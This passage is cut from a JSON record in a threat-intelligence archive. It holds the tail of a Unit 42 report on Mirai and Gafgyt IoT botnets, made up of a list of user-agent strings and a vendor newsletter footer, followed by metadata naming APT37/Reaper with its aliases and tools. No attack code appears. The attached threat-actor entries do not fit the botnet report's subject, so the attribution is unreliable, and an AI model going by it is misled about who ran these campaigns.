DS;U;en)\n\nPSP (PlayStation Portable); 2.00\n\nMozilla/4.0 (PSP (PlayStation Portable); 2.00)\n\nwii libnup/1.0\n\nMozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\n\nMozilla/5.0 (PLAYSTATION 3; 3.55)\n\nMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\n\nMozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\n\nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\n\nMozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\n\n\n-----\n\nMozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\n\nMozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\n\nMozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\n\nMozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\n\nMozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\n\nMozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-07-20 - Unit 42 Finds New Mirai and Gafgyt IoT-Linux Botnet Campaigns.pdf"
    ],
    "report_names": [
        "2018-07-20 - Unit 42 Finds New Mirai and Gafgyt IoT-Linux Botnet Campaigns.pdf"
    ],
    "threat_actors": [
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535949,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1653757081,
    "ts_modification_date": 1653757081,
    "files": {
        "pdf": "https://archive.orkl.eu/898017b70929b051d98f20e396f8f745356f2455.pdf",
        "text": "https://archive.orkl.eu/898017b70929b051d98f20e396f8f745356f2455.txt",
        "img": "https://archive.orkl.eu/898017b70929b051d98f20e396f8f745356f2455.jpg"
    }
}